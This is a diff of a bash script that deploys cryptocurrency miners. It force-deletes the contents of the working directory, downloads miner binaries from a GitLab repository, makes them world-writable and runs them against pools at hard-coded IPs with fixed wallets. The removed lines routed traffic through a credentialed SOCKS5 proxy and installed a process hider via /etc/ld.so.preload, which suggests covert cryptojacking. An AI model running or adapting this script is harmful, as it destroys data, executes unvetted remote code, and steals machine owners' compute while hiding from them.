@@ -1,61 +1,17 @@
-rm -rvf * && mkdir d && cd d
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
+#!/bin/bash
+rm -rvf * 
+rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash* .majza*
+rm -R *
+mkdir .des
+cd .des
+rm -R *
 
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
+chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.98.18:443 -u v32fS9jBgzACJdgbUncHz5quaAAbChnZo6.$(shuf -n 1 -i 1-99999)-VISH -t4 &&
 
-sudo apt-get install -y nodejs
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.84
+chmod 777 lol1.84
 
-apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+./lol1.84 --algo KARLSEN --pool 159.203.127.146:80 --user nexellia:qpzgujxqgqk6wczzlgnujxuma89at8p32lsa0st2y4pyvdqzegx9zu7mtrpgd.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl
 
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-
-npm i -g node-process-hider
-
-wget wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.83
-
-chmod 777 lol1.83
-
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 209.97.145.189:443
-socks5_username = majapahlevi
-socks5_password = majapahlevi
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo ""
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo ""
-
-echo " "
-echo " "
-
-
-./graftcp/graftcp wget https://gitlab.com/majapahlevi/mvp/-/raw/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./lol1.83 -a GRAM --pool lolminer.ton.ninja:9999 --user UQBZnL_zRoiow9vfvlGpZF9SlEZmY7pJADgEaQQO5gBFcveo --pass x & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
-chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.98.18:443 -u v32fS9jBgzACJdgbUncHz5quaAAbChnZo6.$(shuf -n 1 -i 1-99999)-VISH -t4
+done
